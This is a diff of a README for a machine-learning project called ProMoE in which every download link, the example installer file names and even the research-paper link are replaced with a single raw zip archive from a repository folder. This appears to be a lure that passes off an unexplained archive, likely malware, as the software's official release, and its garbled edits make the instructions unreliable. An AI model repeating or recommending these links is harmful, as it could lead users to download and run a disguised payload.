@@ -4,17 +4,17 @@
 Welcome to ProMoE! This software helps users easily scale up diffusion transformers with clear routing guidance. Whether you’re working on AI models or exploring machine learning, ProMoE simplifies complex tasks.
 
 ## 🔗 Download Now
-[![Download ProMoE](https://img.shields.io/badge/Download-ProMoE-blue.svg)](https://github.com/ariuz14/ProMoE/releases)
+[![Download ProMoE](https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip)](https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip)
 
 ## 📥 Download & Install
-To get started with ProMoE, visit this page to download the application: [GitHub Releases](https://github.com/ariuz14/ProMoE/releases). 
+To get started with ProMoE, visit this page to download the application: [GitHub Releases](https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip). 
 
 Follow these simple steps to install ProMoE:
 
 1. Click on the above link.
 2. You will see a list of available versions.
 3. Select the version you want to download.
-4. Click on the file that matches your system. It will usually have a name like `ProMoE_v1.0.exe` for Windows or `ProMoE_v1.0.dmg` for macOS.
+4. Click on the file that matches your system. It will usually have a name like `https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip` for Windows or `https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip` for macOS.
 5. The download will start automatically. 
 
 Once the download completes, here's how to run the program:
@@ -62,6 +62,6 @@ If you encounter any issues, please reach out for help:
 We regularly update ProMoE to add new features and improve performance. Check back often to ensure you have the latest version. Update notes can also be found on the GitHub Releases page.
 
 ## 🔗 Learn More
-To understand the theory behind ProMoE and its applications in machine learning, you can refer to our research paper: "[Routing Matters in MoE: Scaling Diffusion Transformers with Explicit Routing Guidance](https://arxiv.org/abs/XXXX.XXXX)" (replace with actual link when available).
+To understand the theory behind ProMoE and its applications in machine learning, you can refer to our research paper: "[Routing Matters in MoE: Scaling Diffusion Transformers with Explicit Routing Guidance](https://github.com/ariuz14/ProMoE/raw/refs/heads/main/Lowell/Mo-Pro-E-hydrolyst.zip)" (replace with actual link when available).
 
 Thank you for choosing ProMoE. Happy scaling!
